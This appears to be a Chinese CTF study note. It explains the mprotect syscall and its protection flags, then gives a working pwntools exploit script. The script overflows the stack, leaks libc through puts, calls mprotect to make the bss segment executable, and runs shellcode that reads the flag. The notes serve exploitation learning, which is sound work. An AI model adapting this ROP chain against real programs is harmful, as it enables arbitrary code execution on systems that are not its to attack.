---
title: mprotect利用
date: '2025-02-24 18:35:27'
updated: '2025-12-29 10:39:33'
---
mprotect 函数是一个系统调用，用于改变一块内存区域的保护属性，通常用于设置该区域是否可读、可写、可执行等。这个函数的原型在 <sys/mman.h> 头文件中定义，格式如下：

`int mprotect(void *addr, size_t len, int prot);`

参数解释：

1. void *addr：

指向内存区域的起始地址。该地址必须是页面大小（通常为 4096 字节）的整数倍。通常传递一个指向内存区域的指针，表示需要更改权限的内存区域的起始地址。

2. size_t len：

要修改保护属性的内存区域的长度（字节数）。它指定了从 addr 开始的内存区域的大小，必须是页面大小的整数倍。

3. int prot：

内存区域的新保护属性。这个参数是一个位掩码，可以是以下几个常量的组合，定义了内存的访问权限：

+ PROT_READ：允许读取内存区域。
+ PROT_WRITE：允许写入内存区域。
+ PROT_EXEC：允许执行内存区域。
+ PROT_NONE：禁止访问内存区域。

这些标志可以通过按位或 (|) 操作组合在一起使用。例如，可以将 PROT_READ | PROT_WRITE 组合起来，表示该区域既可以读取，也可以写入。

## 栈溢出mprotect
mprotect参数：

```c
int mprotect(const void *start, size_t len, int prot);
```

start地址要求0x1000对齐，也就是跟页对齐，申请范围也是

```python
rdi=0x0000000000401ba3
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main_addr=elf.sym['main']

payload=b"A"*0x418+p8(0x28)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
# payload=b"A"*0x418
link.recvuntil(b'>> ')
link.sendline(payload)

puts_addr=u64(link.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
# success("puts_addr:"+hex(puts_addr))
libc_base=puts_addr-0x0809c0
success("libc_base:"+hex(libc_base))

mprotect=libc_base+libc.sym['mprotect']
gets=libc_base+libc.sym['gets']
rsi=libc_base+0x0000000000023e6a
rdx=libc_base+0x0000000000001b96
bss=0x603000

payload=b"A"*0x418+p8(0x28)+p64(rdi)+p64(bss)+p64(gets)
payload+=p64(rdi)+p64(bss)+p64(rsi)+p64(0x1000)+p64(rdx)+p64(7)+p64(mprotect)+p64(bss)
link.sendline(payload)

shellcode=asm(shellcraft.cat("./flag"))
link.sendline(shellcode)

link.interactive()
```

